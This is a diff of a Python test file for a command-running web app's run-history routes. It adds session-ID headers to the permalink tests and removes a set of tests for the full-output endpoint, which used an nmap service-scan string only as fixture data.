@@ -2093,7 +3946,10 @@ class TestRunPermalinkRoute:
             ["Nmap done"],
         )
         try:
-            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
+            body = get_client().get(
+                f"/history/{run_id}",
+                headers={"X-Session-ID": "test-session"},
+            ).get_data(as_text=True)
             assert "1m 30s" in body
         finally:
             self._delete_run(run_id)
@@ -2106,7 +3962,10 @@ class TestRunPermalinkRoute:
             ["line1", "line2", "line3"],
         )
         try:
-            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
+            body = get_client().get(
+                f"/history/{run_id}",
+                headers={"X-Session-ID": "test-session"},
+            ).get_data(as_text=True)
             # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
             assert "lines" in body
         finally:
@@ -2120,85 +3979,13 @@ class TestRunPermalinkRoute:
             "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
         )
         try:
-            body = get_client().get(f"/history/{run_id}").get_data(as_text=True)
+            body = get_client().get(
+                f"/history/{run_id}",
+                headers={"X-Session-ID": "test-session"},
+            ).get_data(as_text=True)
             assert f"v{APP_VERSION}" in body
         finally:
             self._delete_run(run_id)
-
-
-class TestRunFullOutputRoute:
-    def _insert_run(self, run_id, command):
-        conn = sqlite3.connect(DB_PATH)
-        conn.execute(
-            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
-            "VALUES (?, 'test-session', ?, datetime('now'), 1)",
-            (run_id, command)
-        )
-        conn.execute(
-            "INSERT INTO run_output_artifacts (run_id, rel_path, compression, byte_size, line_count, truncated, created) "
-            "VALUES (?, ?, 'gzip', 12, 2, 0, datetime('now'))",
-            (run_id, f"{run_id}.txt.gz")
-        )
-        conn.commit()
-        conn.close()
-
-        import gzip
-        from run_output_store import RUN_OUTPUT_DIR, ensure_run_output_dir
-        ensure_run_output_dir()
-        with gzip.open(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"), "wt", encoding="utf-8") as f:
-            f.write("line 1\nline 2\n")
-
-    def _delete_run(self, run_id):
-        from run_output_store import RUN_OUTPUT_DIR
-        conn = sqlite3.connect(DB_PATH)
-        conn.execute("DELETE FROM run_output_artifacts WHERE run_id = ?", (run_id,))
-        conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
-        conn.commit()
-        conn.close()
-        try:
-            os.unlink(os.path.join(RUN_OUTPUT_DIR, f"{run_id}.txt.gz"))
-        except FileNotFoundError:
-            pass
-
-    def test_full_output_json_returns_artifact_lines(self):
-        run_id = "permalink-full-json-test-run"
-        self._insert_run(run_id, "nmap -sV 10.0.0.1")
-        try:
-            data = json.loads(get_client().get(f"/history/{run_id}/full?json").data)
-            assert data["command"] == "nmap -sV 10.0.0.1"
-            assert data["output"] == ["line 1", "line 2"]
-        finally:
-            self._delete_run(run_id)
-
-    def test_full_output_html_alias_matches_canonical_permalink(self):
-        run_id = "permalink-full-html-test-run"
-        self._insert_run(run_id, "nmap -sV 10.0.0.1")
-        try:
-            resp = get_client().get(f"/history/{run_id}/full")
-            assert resp.status_code == 200
-            assert b"line 1" in resp.data
-        finally:
-            self._delete_run(run_id)
-
-    def test_full_output_alias_falls_back_to_preview_when_artifact_is_unavailable(self):
-        run_id = "permalink-full-missing-artifact-run"
-        conn = sqlite3.connect(DB_PATH)
-        conn.execute(
-            "INSERT INTO runs (id, session_id, command, started, full_output_available) "
-            "VALUES (?, 'test-session', ?, datetime('now'), 0)",
-            (run_id, "nmap -sV 10.0.0.1"),
-        )
-        conn.commit()
-        conn.close()
-        try:
-            resp = get_client().get(f"/history/{run_id}/full")
-            assert resp.status_code == 200
-            assert b"nmap -sV 10.0.0.1" in resp.data
-        finally:
-            conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
-            conn.commit()
-            conn.close()
 
 
 # ── Response content types ────────────────────────────────────────────────────
